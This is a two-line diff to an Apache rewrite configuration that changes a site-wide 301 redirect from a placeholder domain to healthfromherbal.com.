@@ -1,2 +1,2 @@
 RewriteEngine on 
-RewriteRule ^(.*)$ http://www.newdomain.com/ [R=301,L]
+RewriteRule ^(.*)$ https://healthfromherbal.com/ [R=301,L]
